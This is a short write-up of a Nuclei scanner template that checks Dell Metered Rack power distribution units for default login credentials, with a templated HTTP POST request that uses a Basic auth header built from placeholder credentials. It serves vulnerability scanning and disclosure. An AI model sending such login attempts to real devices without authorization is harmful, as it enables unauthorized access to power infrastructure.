# Nuclei Template: Dell DPI Remote Power Management - Default Login
**Template ID:** dell-dpi-default-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** Medium
**CWE:** CWE-798
**Source:** Nuclei Template (`dell-dpi-default-login.yaml`)

## Vulnerability Information & PoC

## Description
The Dell Metered Rack Power Distribution Unit uses a default username and password which is widely known, and any user could change the default password with access.

## Steps to reproduce / Exploit Payload
```http
POST /index2.html HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64('{{username}}:{{password}}')}}

POST /index2.html HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64('{{str}}:{{str}}')}}
```

## References
- https://dl.dell.com/manuals/all-products/esuprt_ser_stor_net/esuprt_rack_infrastructure/dell-metered-pdu_user%27s%20guide3_en-us.pdf
